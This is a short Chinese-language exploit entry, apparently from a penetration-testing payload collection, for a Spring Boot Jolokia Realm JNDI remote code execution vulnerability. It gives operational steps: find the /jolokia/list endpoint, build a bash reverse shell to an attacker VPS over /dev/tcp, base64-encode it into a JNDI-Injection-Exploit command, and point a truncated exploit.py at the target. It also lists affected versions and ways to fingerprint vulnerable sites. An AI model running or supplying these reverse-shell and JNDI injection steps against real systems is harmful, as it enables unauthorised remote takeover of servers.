# SpringBootjolokiaRealmJNDI远程代码执行漏洞

- **系统**：SpringBootjolokiaRealmJNDI　|　**类型**：命令执行　|　**CVE**：—

**请求体 / payload**
```
1. 确认存在`type=MBeanFactory`和`createJNDIRealm`关键字时，存在Spring jolokia Realm JNDI远程代码执行漏洞

2. 生成反弹shell命令
/bin/bash -i >& /dev/tcp/xx.xx.xx.xx/7777 0>&1
2. 将上述反弹shell命令base64编码后替换到下述`command`字符处，`vps`处填写为`vps ip`
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,command}{base64,-d}{bash,-i}" -A "vps"
3. 将`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`上传到vps中运行上述命令
\[JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar]\(公众号：渗透安全HackTwo>\

4. 修改 expliot 中的 url 和 rmi 地址
\[exploit.py]\(公众号：渗透安全HackTwo>…（脚本共 756 字，完整版见原文）
```

**其他**
- Spring Boot jolokia Realm JNDI远程代码执行漏洞: * 一、漏洞简介
  * 二、影响版本
* 三、系统特征
* 四、漏洞复现
***
- 版本: * Spring Boot < 1.5 默认未授权访问所有端点
* Spring Boot >= 1.5 默认只允许访问/health和/info端点，但是此安全性通常被应用程序开发人员禁用
Spring Boot 1.x版本端点在根URL下注册。\

Spring Boot 2.x版本端点移动到/actuator/路径。\
- 系统特征: 1. 网站图片文件是一个绿色的树叶。
2. 特有的报错信息。
3. 存在`/jolokia/list`接口